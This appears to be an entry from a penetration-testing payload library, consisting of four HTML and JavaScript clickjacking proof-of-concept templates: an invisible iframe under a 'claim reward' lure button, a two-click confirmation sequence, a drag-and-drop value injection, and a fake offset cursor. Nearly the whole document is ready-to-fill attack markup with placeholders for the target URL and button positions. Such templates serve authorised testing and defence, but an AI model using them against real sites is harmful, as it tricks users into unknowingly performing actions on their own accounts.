---
id: "clickjacking-payloads"
title: "Clickjacking PoC Templates"
type: "payload"
category: "web-application"
subcategory: "client-side"
tags: ["clickjacking", "iframe", "poc", "ui-redressing"]
platforms: ["linux", "macos", "windows"]
related: ["clickjacking", "csrf-modern"]
difficulty: "beginner"
updated: "2026-04-14"
---

# Clickjacking PoC Templates

## Basic Clickjacking
```html
<html><head><style>
iframe{position:relative;width:600px;height:800px;opacity:0.0001;z-index:2;}
button{position:absolute;top:BUTTON_Y_px;left:BUTTON_X_px;z-index:1;padding:20px;font-size:18px;cursor:pointer;}
</style></head><body>
<button>Click to claim reward!</button>
<iframe src="TARGET_URL"></iframe>
</body></html>
```

## Multi-Step (Two-Click)
```html
<html><head><style>
iframe{position:relative;width:600px;height:800px;opacity:0.0001;z-index:2;}
#s1{position:absolute;top:Y1px;left:X1px;z-index:1;}
#s2{position:absolute;top:Y2px;left:X2px;z-index:1;display:none;}
</style>
<script>
document.onclick=function(){
  document.getElementById('s1').style.display='none';
  document.getElementById('s2').style.display='block';
};
</script></head><body>
<div id="s1"><button>Step 1: Click here</button></div>
<div id="s2"><button>Step 2: Confirm</button></div>
<iframe src="TARGET_URL"></iframe>
</body></html>
```

## Drag-and-Drop
```html
<div draggable="true" ondragstart="event.dataTransfer.setData('text','INJECTED_VALUE')">
  Drag this to the box →
</div>
<div style="width:200px;height:200px;border:2px dashed gray;">Drop here</div>
<iframe src="TARGET_URL" style="opacity:0.0001;position:absolute;z-index:2;"></iframe>
```

## With Cursor Manipulation
```html
<style>
body{cursor:none;}
#fake-cursor{position:fixed;z-index:9999;pointer-events:none;}
</style>
<img id="fake-cursor" src="data:image/png;base64,..." width="32">
<script>
document.onmousemove=function(e){
  var c=document.getElementById('fake-cursor');
  c.style.left=(e.clientX-200)+'px';  // Offset fake cursor
  c.style.top=(e.clientY-200)+'px';
};
</script>
<iframe src="TARGET_URL" style="opacity:0.0001;z-index:2;"></iframe>
```
